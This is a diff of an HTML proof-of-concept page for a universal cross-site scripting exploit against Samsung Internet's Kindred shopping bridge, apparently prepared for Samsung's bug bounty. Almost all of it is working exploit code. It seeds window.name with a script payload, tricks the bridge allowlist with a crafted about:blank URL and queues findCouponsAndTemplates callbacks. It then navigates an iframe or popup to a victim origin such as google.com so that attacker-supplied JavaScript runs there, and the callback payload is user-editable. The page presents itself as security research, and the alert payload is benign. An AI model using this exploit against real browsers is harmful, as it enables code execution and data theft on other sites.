@@ -1,121 +1,94 @@
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Samsung Kindred UXSS PoC (instrumented, benign)</title>
-  <style>
-    body { max-width: 760px; margin: 24px auto; padding: 0 16px; font: 15px/1.5 system-ui, sans-serif; }
-    button { padding: 12px 18px; font: inherit; font-weight: 650; width:100%; margin:6px 0; }
-    pre { min-height: 14em; padding: 12px; overflow-wrap: anywhere; white-space: pre-wrap; background: #f3f4f6; font-size:12px; }
-    .warn{color:#b23;font-size:12px}
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Kindred UXSS variant (iframe + direct-eval)</title>
+<style>
+ body{max-width:760px;margin:24px auto;padding:0 16px;font:15px/1.5 system-ui,sans-serif}
+ button{padding:12px 18px;font:inherit;font-weight:650;width:100%;margin:6px 0}
+ input{width:100%;padding:9px;font:inherit;border:1px solid #ccc;border-radius:6px;margin:4px 0}
+ pre{min-height:14em;padding:12px;white-space:pre-wrap;overflow-wrap:anywhere;background:#f3f4f6;font-size:12px}
+ .warn{color:#b23;font-size:12px}
+ iframe{display:none}
+</style>
 </head>
 <body>
-  <main id="main">
-    <h1>Samsung Internet Kindred UXSS — instrumented (benign)</h1>
-    <p class="warn">Benign browser-isolation test. Payload only proves origin via alert(document.domain) + a neutral marker — no defacement, no data theft. Own test build. Report to Samsung Mobile
- Security Rewards.</p>
-    <button id="run" type="button">Run PoC (watch the log for the failing GATE)</button>
-    <pre id="log" aria-live="polite"></pre>
-  </main>
+<h1>Kindred UXSS — variant: iframe delivery + direct-eval callback (benign)</h1>
+<p class="warn">Benign. Proof via alert(document.domain) only; no defacement, no data theft. Own build. Samsung Mobile Security Rewards.</p>
 
-  <script>
-  (() => {
-    'use strict';
-    const params = new URLSearchParams(location.search);
-    if (params.has('bootstrap')) {
-      document.querySelector('#main').innerHTML =
-        '<h1>Attacker bootstrap document</h1><p>Waiting for the parent controller.</p>';
-      return;
-    }
+<p>bypass URL</p><input id="trig" value="about:blank#kindred-probe://amazon.com/">
+<p>victim origin (your logic: google.com)</p><input id="victim" value="https://www.google.com/">
+<p>callback payload (A = direct eval; leave as-is to test eval semantics)</p>
+<input id="cb" value="alert(document.domain)">
+<p>delivery</p>
+<button onclick="go('iframe')">B · run via IFRAME (no popup block)</button>
+<button onclick="go('popup')">run via POPUP (fallback)</button>
+<pre id="log"></pre>
 
-    const output = document.querySelector('#log');
-    const button = document.querySelector('#run');
-    let running = false, enumerated = false;
+<iframe id="f"></iframe>
 
-    function log(message){ const t=new Date().toISOString().slice(11,23); output.textContent += `[${t}] ${message}\n`; }
+<script>
+(() => {
+'use strict';
+const params=new URLSearchParams(location.search);
+if(params.has('bootstrap')){ document.body.innerHTML='<h1>bootstrap</h1>'; return; }
+const out=document.getElementById('log');
+function log(m){ const t=new Date().toISOString().slice(11,23); out.textContent+=`[${t}] ${m}\n`; }
+const vm=/SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
+log('SamsungBrowser='+(vm?vm[1]:'NOT DETECTED'));
 
-    // version gate
-    const vm = /SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
-    log('UA SamsungBrowser=' + (vm?vm[1]:'NOT SAMSUNG — open in Samsung Internet'));
-    if (vm && vm[1] !== '30.0.5.24') log('NOTE: this PoC was written for 30.0.5.24; you are on '+vm[1]+'. Bridge/method names or the bypass may differ or be patched.');
+// window.name payload still seeded, so callback='window.name.toString' path also works if direct-eval doesn't
+const NAMEPAYLOAD='<scr'+'ipt>alert("BENIGN UXSS — ran as "+document.domain);</scr'+'ipt>';
 
-    function bootstrapUrl(){ const u=new URL(location.href); u.searchParams.set('bootstrap', String(Date.now())); u.hash='attacker-bootstrap'; return u.href; }
+function val(id,d){ const v=document.getElementById(id).value; return (v&&v.trim())||d; }
 
-    // BENIGN payload (was: PWNED defacement) — proves cross-origin execution only
-    const PAYLOAD = '<scr'+'ipt>alert("BENIGN UXSS — ran as "+document.domain);document.write("<h1>BENIGN UXSS TEST \\u2014 executed as "+document.domain+"</h1>");</scr'+'ipt>';
+function go(mode){
+  const trig=val('trig','about:blank#kindred-probe://amazon.com/');
+  const victim=val('victim','https://www.google.com/');
+  const cb=val('cb','alert(document.domain)');
+  log(`--- run mode=${mode} callback="${cb}" ---`);
 
-    function run(){
-      if (running) return;
-      const popup = open(bootstrapUrl(), '_blank');
-      if (!popup){ log('GATE0 FAIL: popup blocked — allow popups and click the button'); return; }
-      running = true; button.disabled = true;
-      log('GATE0 ok: popup opened (attacker origin, readable)');
+  let win, setSrc, reload;
+  if(mode==='iframe'){
+    const f=document.getElementById('f');
+    setSrc=(u)=>{ f.src=u; }; reload=()=>{ try{f.contentWindow.location.reload();}catch(e){ f.src=f.src; } };
+    setSrc(trig);
+    setTimeout(()=>{ win=f.contentWindow; try{ win.name=NAMEPAYLOAD; }catch(e){} log('iframe set to bypass URL; name seeded'); afterLoad(()=>f.contentWindow, (u)=>{f.src=u;}, reload, victim, cb); }
+, 300);
+  } else {
+    const p=open(location.href.split('#')[0].split('?')[0]+'?bootstrap='+Date.now(),'_blank');
+    if(!p){ log('popup blocked'); return; }
+    try{ p.name=NAMEPAYLOAD; }catch(e){}
+    setTimeout(()=>{ try{p.location.replace(trig);}catch(e){log('nav err '+e);} log('popup set to bypass URL; name seeded'); afterLoad(()=>p, (u)=>{try{p.location.replace(u);}catch(e){}}, ()=>{try{
+p.location.reload();}catch(e){}}, victim, cb); }, 300);
+  }
+}
 
-      popup.name = PAYLOAD;
-      log('seeded window.name with benign domain-proof payload (survives cross-origin nav)');
-
-      // phase 1: parser-confused about:blank to trip the allowlist
-      setTimeout(() => {
-        try { popup.location.replace('about:blank#kindred-probe://amazon.com/'); log('phase1: navigated popup to parser-confused about:blank#...amazon.com'); }
-        catch (e){ log('phase1 FAIL: '+e); }
-      }, 750);
-
-      // phase 2: reload to materialize the bridge
-      setTimeout(() => {
-        try { popup.location.reload(); log('phase2: reloaded crafted about:blank to materialize KindredWebInterface'); }
-        catch (e){ log('phase2 FAIL: '+e); }
-      }, 2000);
-
-      // GATE1: does KindredWebInterface appear?  (also enumerate kindred-ish globals so we see renames)
-      const started = performance.now();
-      let sawAnyKindredGlobal = false;
-      const poll = setInterval(() => {
-        const dt = Math.round(performance.now() - started);
-        if (dt > 20000){
-          clearInterval(poll); running=false; button.disabled=false;
-          log('GATE1 TIMEOUT: KindredWebInterface never appeared in 20s.');
-          log('=> Most likely: Smart Shopping off/region-gated, OR the about:blank#...amazon.com bypass does not pass the allowlist in your build, OR the bridge was renamed/removed. Run the recon
-file (step 1b baseline on real amazon) to confirm the feature injects ANY web-context bridge at all.');
-          return;
-        }
-        try {
-          // surface ANY kindred-ish global even if the exact name changed
-          if (!sawAnyKindredGlobal){
-            for (const k in popup){ if (/kindred|coupon|shop|sbrowser|samsung/i.test(k)){ sawAnyKindredGlobal=true; log('GATE1 hint: child has global "'+k+'" @+'+dt+'ms'); } }
-          }
-          if (typeof popup.KindredWebInterface === 'undefined') return;
-          clearInterval(poll);
-          log('GATE1 ok: KindredWebInterface acquired @+'+dt+'ms (in attacker-origin document)');
-
-          // enumerate the real methods once (confirms signatures / patches)
-          if (!enumerated){ enumerated=true; try{
-            const methods=[]; for (const k in popup.KindredWebInterface) methods.push(k);
-            log('bridge methods: '+(methods.join(', ')||'(none enumerable)'));
-          }catch(e){ log('enumerate err '+e); } }
-
-          // GATE2: guard method
-          let guardProof;
-          try { guardProof = popup.KindredWebInterface.isCheckoutPage('amazon.com'); log('GATE2 ok: isCheckoutPage("amazon.com")='+guardProof); }
-          catch (e){ log('GATE2 FAIL: isCheckoutPage threw '+e+' (method renamed/removed?)'); running=false; button.disabled=false; return; }
-
-          // GATE3: queue the async callback sink, then navigate to google so it lands cross-origin
-          try {
-            for (let i=0;i<10;i++){ popup.KindredWebInterface.findCouponsAndTemplates(`uxss-delay-${Date.now()}-${i}.amazon.com`,'','console.log',1); }
-            popup.KindredWebInterface.findCouponsAndTemplates('amazon.com','','window.name.toString',1);
-            log('GATE3: queued findCouponsAndTemplates callbacks (incl. window.name.toString)');
-          } catch (e){ log('GATE3 FAIL: findCouponsAndTemplates threw '+e+' (sink renamed/removed/patched?)'); running=false; button.disabled=false; return; }
-
-          popup.location.replace('https://www.google.com/');
-          log('GATE4: navigated popup to https://www.google.com/ . If the async callback fires now, you should see an ALERT "BENIGN UXSS — ran as www.google.com" ON the google tab = UXSS.');
-          log('If google loads clean with no alert within a few seconds => callback did not execute cross-origin (sync, or patched).');
-          running=false; button.disabled=false;
-        } catch (e){ clearInterval(poll); running=false; button.disabled=false; log('poll err: '+e); }
-      }, 100);
-    }
-
-    button.addEventListener('click', run);
-  })();
-  </script>
+function afterLoad(getWin, navTo, reload, victim, cb){
+  setTimeout(reload, 1500);              // materialize bridge
+  const t0=performance.now();
+  const poll=setInterval(()=>{
+    const dt=Math.round(performance.now()-t0);
+    if(dt>20000){ clearInterval(poll); log('GATE1 TIMEOUT: KindredWebInterface never appeared (feature off / bypass rejected / renamed in this version)'); return; }
+    let w; try{ w=getWin(); }catch(e){ return; }
+    try{
+      for(const k in w){ if(/kindred|coupon|shop|samsung|sbrowser/i.test(k)) { /*hint*/ } }
+      if(typeof w.KindredWebInterface==='undefined') return;
+      clearInterval(poll);
+      const methods=[]; try{ for(const k in w.KindredWebInterface) methods.push(k); }catch(e){}
+      log('GATE1 ok @+'+dt+'ms. bridge methods: '+(methods.join(', ')||'(none)'));
+      try{ log('GATE2 isCheckoutPage("amazon.com")='+w.KindredWebInterface.isCheckoutPage('amazon.com')); }catch(e){ log('GATE2 FAIL '+e); }
+      try{
+        for(let i=0;i<10;i++) w.KindredWebInterface.findCouponsAndTemplates(`d-${Date.now()}-${i}.amazon.com`,'',cb,1);
+        w.KindredWebInterface.findCouponsAndTemplates('amazon.com','',cb,1);
+        log('GATE3 queued callback="'+cb+'" x11');
+      }catch(e){ log('GATE3 FAIL '+e); return; }
+      navTo(victim);
+      log('GATE4 navigated to '+victim+'. If alert "ran as '+ (victim.replace(/^https?:\/\//,'').replace(/\/.*/,'')) +'" fires => UXSS. (iframe: alert still pops from the frame context.)');
+    }catch(e){ clearInterval(poll); log('poll err '+e); }
+  },100);
+}
+})();
+</script>
 </body>
 </html>
